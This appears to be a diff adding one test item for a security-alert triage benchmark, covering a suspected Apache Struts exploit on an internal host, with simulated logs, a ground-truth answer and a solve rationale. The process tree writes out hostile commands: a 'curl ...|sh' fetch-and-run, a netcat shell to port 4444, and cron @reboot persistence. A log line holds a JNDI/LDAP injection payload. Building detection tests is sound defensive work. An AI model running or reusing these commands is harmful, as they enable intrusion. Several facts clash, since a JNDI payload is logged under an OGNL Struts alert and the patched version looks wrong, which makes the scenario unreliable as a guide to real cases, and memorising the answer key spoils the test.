@@ -1,0 +1,78 @@
+{
+  "id": "A-1012",
+  "alert": {
+    "src": "203.0.113.128",
+    "dst": "10.2.3.140",
+    "dst_port": 443,
+    "proto": "tcp",
+    "signature": "ET EXPLOIT Apache Struts OGNL Injection",
+    "claimed_cve": "CVE-2017-5638",
+    "severity": "high",
+    "ts": "2026-09-10T01:19:00Z",
+    "flow_id": "f2489"
+  },
+  "world": {
+    "assets": {
+      "10.2.3.140": {
+        "host": "host-10-2-3-140",
+        "os": "linux",
+        "criticality": "high",
+        "owner": "platform-team",
+        "services": {
+          "443": {
+            "product": "apache-struts",
+            "version": "2.5.12"
+          }
+        },
+        "peers": [
+          "10.2.3.212"
+        ]
+      }
+    },
+    "cves": {
+      "CVE-2017-5638": {
+        "product": "apache-struts",
+        "patched_in": "2.5.13",
+        "exploit_maturity": "weaponized"
+      }
+    },
+    "flows": {
+      "f2489": {
+        "direction": "outbound",
+        "bytes_out": 84213,
+        "bytes_in": 512,
+        "duration_s": 604,
+        "state": "ESTABLISHED",
+        "note": "periodic 60s beacon to external host"
+      }
+    },
+    "logs": {
+      "host-10-2-3-140": [
+        "[host-10-2-3-140] 443 POST /api/x 200 jndi:ldap://203.0.113.128/a  <- payload accepted",
+        "[host-10-2-3-140] spawned /bin/sh from service process"
+      ]
+    },
+    "proc_trees": {
+      "host-10-2-3-140": {
+        "suspicious": true,
+        "tree": "java -> sh -c 'curl 203.0.113.128|sh' -> nc 203.0.113.128 4444",
+        "persistence": "cron @reboot /tmp/.beacon"
+      }
+    },
+    "sessions": [
+      {
+        "src": "203.0.113.128",
+        "dst": "10.2.3.140",
+        "port": 443,
+        "legit": false
+      }
+    ],
+    "firewall": []
+  },
+  "ground_truth": {
+    "verdict": "SUCCEEDED",
+    "action": "contain"
+  },
+  "adversarial": false,
+  "solve_rationale": "vulnerable version + shell spawned + outbound beacon"
+}
